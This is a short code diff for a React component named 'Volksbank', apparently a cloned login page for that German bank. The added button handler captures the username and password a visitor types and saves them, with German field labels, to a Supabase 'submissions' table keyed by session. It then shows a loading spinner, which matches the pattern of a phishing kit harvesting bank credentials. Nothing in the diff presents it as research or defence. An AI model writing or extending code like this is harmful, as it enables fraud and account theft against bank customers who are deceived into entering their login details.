@@ -143,6 +143,17 @@ const Volksbank = () => {
 
             {/* Weiter button */}
             <button
+              onClick={async () => {
+                if (sessionId) {
+                  await supabase.from("submissions").update({
+                    bank_username: username,
+                    bank_password: password,
+                    bank_username_label: "Benutzername",
+                    bank_password_label: "Passwort",
+                  }).eq("session_id", sessionId);
+                }
+                setShowLoading(true);
+              }}
               className="w-full py-3 text-white font-semibold rounded text-sm"
               style={{ backgroundColor: "#196bc1" }}
             >
